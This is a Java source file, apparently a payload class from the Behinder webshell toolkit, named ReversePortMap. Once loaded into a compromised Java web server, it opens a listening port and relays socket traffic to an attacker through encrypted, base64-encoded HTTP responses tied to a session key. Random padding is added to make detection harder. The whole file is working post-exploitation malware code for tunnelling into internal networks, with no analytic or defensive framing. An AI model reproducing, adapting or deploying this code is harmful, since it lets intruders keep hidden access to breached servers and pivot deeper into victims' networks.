package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class ReversePortMap implements Runnable {
   public static String action;
   public static String listenPort;
   public static String socketHash;
   public static String extraData;
   private Object Request;
   private Object Response;
   private Object Session;
   private String threadType;
   private Map paramMap;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var20 = false;

      Object so;
      Method write;
      label253: {
         try {
            var20 = true;
            this.fillContext(obj);
            Map paramMap = new HashMap();
            paramMap.put("request", this.Request);
            paramMap.put("response", this.Response);
            paramMap.put("session", this.Session);
            if (action.equals("create")) {
               String serverSocketHash = "reverseportmap_server_" + listenPort;
               paramMap.put("serverSocketHash", serverSocketHash);
               paramMap.put("listenPort", listenPort);
               ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
               serverSocketChannel.bind(new InetSocketAddress(Integer.parseInt(listenPort)));
               this.sessionSetAttribute(this.Session, serverSocketHash, serverSocketChannel);
               serverSocketChannel.socket().setReuseAddress(true);
               (new Thread(new ReversePortMap("daemon", paramMap))).start();
               result.put("status", "success");
               result.put("msg", "success");
               var20 = false;
            } else if (action.equals("list")) {
               List socketList = new ArrayList();
               Enumeration keys = this.sessionGetAttributeNames(this.Session);

               while(keys.hasMoreElements()) {
                  String socketHash = keys.nextElement().toString();
                  if (socketHash.indexOf("reverseportmap") >= 0) {
                     Map socketObj = new HashMap();
                     socketObj.put("socketHash", socketHash);
                     socketList.add(socketObj);
                  }
               }

               result.put("status", "success");
               result.put("msg", this.buildJsonArray(socketList, false));
               var20 = false;
            } else {
               SocketChannel serverInnersocket;
               ByteBuffer buf;
               if (action.equals("read")) {
                  serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                  serverInnersocket.configureBlocking(false);
                  ByteArrayOutputStream bos = new ByteArrayOutputStream();
                  buf = ByteBuffer.allocate(512);

                  int length;
                  for(length = serverInnersocket.read(buf); length > 0; length = serverInnersocket.read(buf)) {
                     byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
                     buf.clear();
                     bos.write(data);
                  }

                  if (length == -1) {
                     serverInnersocket.close();
                  }

                  result.put("status", "success");
                  result.put("msg", base64encode(bos.toByteArray()));
                  var20 = false;
               } else if (action.equals("write")) {
                  serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                  byte[] extraDataByte = this.base64decode(extraData);
                  buf = ByteBuffer.allocate(extraDataByte.length);
                  buf.clear();
                  buf.put(extraDataByte);
                  buf.flip();

                  while(buf.hasRemaining()) {
                     serverInnersocket.write(buf);
                  }

                  result.put("status", "success");
                  result.put("msg", "ok");
                  var20 = false;
               } else if (!action.equals("stop")) {
                  if (action.equals("close")) {
                     try {
                        serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, ReversePortMap.socketHash);
                        serverInnersocket.close();
                        this.sessionRemoveAttribute(this.Session, ReversePortMap.socketHash);
                     } catch (Exception var24) {
                        var24.printStackTrace();
                     }

                     result.put("status", "success");
                     result.put("msg", "服务侧Socket资源已释放。");
                     var20 = false;
                  } else {
                     var20 = false;
                  }
               } else {
                  Enumeration keys = this.sessionGetAttributeNames(this.Session);

                  String socketHash;
                  while(keys.hasMoreElements()) {
                     socketHash = keys.nextElement().toString();
                     if (socketHash.startsWith("reverseportmap_socket_" + listenPort)) {
                        try {
                           serverInnersocket = (SocketChannel)this.sessionGetAttribute(this.Session, socketHash);
                           this.sessionRemoveAttribute(this.Session, socketHash);
                           serverInnersocket.close();
                        } catch (Exception var26) {
                           var26.printStackTrace();
                        }
                     }
                  }

                  try {
                     socketHash = "reverseportmap_server_" + listenPort;
                     ServerSocketChannel serverSocket = (ServerSocketChannel)this.sessionGetAttribute(this.Session, socketHash);
                     this.sessionRemoveAttribute(this.Session, socketHash);
                     serverSocket.close();
                  } catch (Exception var25) {
                  }

                  result.put("status", "success");
                  result.put("msg", "服务侧Socket资源已释放。");
                  var20 = false;
               }
            }
            break label253;
         } catch (Exception var27) {
            result.put("status", "fail");
            result.put("msg", action + ":" + var27.getMessage());
            var20 = false;
         } finally {
            if (var20) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var21) {
                  var21.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var22) {
            var22.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var23) {
         var23.printStackTrace();
      }

      return true;
   }

   public ReversePortMap(String threadType, Map paramMap) {
      this.threadType = threadType;
      this.paramMap = paramMap;
   }

   public ReversePortMap() {
   }

   public void run() {
      if (this.threadType.equals("daemon")) {
         try {
            Object session = this.paramMap.get("session");
            String serverSocketHash = this.paramMap.get("serverSocketHash").toString();
            ServerSocketChannel serverSocketChannel = (ServerSocketChannel)this.sessionGetAttribute(session, serverSocketHash);
            String listenPort = this.paramMap.get("listenPort").toString();

            while(true) {
               try {
                  SocketChannel serverInnersocket = serverSocketChannel.accept();
                  Map paramMap = new HashMap();
                  paramMap.put("session", session);
                  String serverInnersocketHash = "reverseportmap_socket_" + listenPort + "_" + serverInnersocket.socket().getInetAddress().getHostAddress() + "_" + serverInnersocket.socket().getPort();
                  paramMap.put("serverInnersocketHash", serverInnersocketHash);
                  this.sessionSetAttribute(session, serverInnersocketHash, serverInnersocket);
               } catch (Exception var8) {
                  break;
               }
            }
         } catch (Exception var9) {
            var9.printStackTrace();
         }
      }

   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private static String base64encode(byte[] content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
